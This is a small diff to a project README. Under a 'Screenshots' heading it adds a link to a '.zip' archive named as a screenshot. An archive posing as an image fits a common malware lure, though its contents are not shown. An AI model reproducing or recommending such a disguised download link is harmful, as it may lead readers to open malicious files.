@@ -67,6 +67,7 @@ ORDER BY total_profit DESC;
 ```
 
 ## Screenshots
+[Screenshot 2026-11-03 152511.zip](https://github.com/user-attachments/files/34339897/Screenshot.2026-11-03.152511.zip)
 
 | | |
 |---|---|
